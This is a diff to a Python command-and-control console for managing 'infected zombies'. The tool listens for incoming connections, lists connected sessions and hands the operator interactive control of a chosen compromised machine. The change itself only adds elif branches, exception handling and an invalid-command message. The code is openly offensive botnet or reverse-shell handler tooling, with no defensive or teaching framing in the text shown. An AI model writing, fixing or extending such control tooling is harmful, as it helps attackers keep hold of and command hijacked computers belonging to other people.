@@ -49,7 +49,7 @@ while True:
 	if cmd == "listen":
 		server.listen(subcmd, int(arg))
 
-	if cmd == "help":
+	elif cmd == "help":
 		print('''
 			                       Commands
 ------------------------------------------------------------------------------------------------------
@@ -61,21 +61,35 @@ control <session>         --          controls an infected zombie by session num
 
 		''')
 
-	if cmd == "control":
-		zombie = server.c[int(subcmd)-1]
-		hello = "\n"
-		zombie.send(hello.encode())
-		print("Entering control mode for zombie " + subcmd + " on address " + str(zombie.getpeername()))
-		server.control(zombie)	
-
-	if cmd == "show" and subcmd == "connections":
-		session = 0
-		for i in server.c:
-			if(i != None):
-				session+=1
-				print("session " + str(session) + " connected on address: " + str(i.getpeername()))
-		print()	
+	elif cmd == "control":
 		
+		try:
+			zombie = server.c[int(subcmd)-1]
+			hello = "\n"
+			zombie.send(hello.encode())
+			print("Entering control mode for zombie " + subcmd + " on address " + str(zombie.getpeername()))
+			server.control(zombie)	
+		except OSError:
+			print("Zombie is currently disconnected on selected session")
 
-	if cmd == "exit":
+	elif cmd == "show" and subcmd == "connections":
+		
+		try:
+			session = 0
+			for i in server.c:
+				if(i != None):
+					session+=1
+					print("session " + str(session) + " connected on address: " + str(i.getpeername()))
+			print()	
+		
+		except AttributeError:
+			print("Server hasn't started yet. Type \"listen <LHOST> <LPORT>\" to start listening for connections\n")
+		
+		except OSError:
+			print("No zombies are currently connected\n")
+
+	elif cmd == "exit":
 		exit()
+
+	else:
+		print("Invalid command, type \"help\" for a list of commands\n")
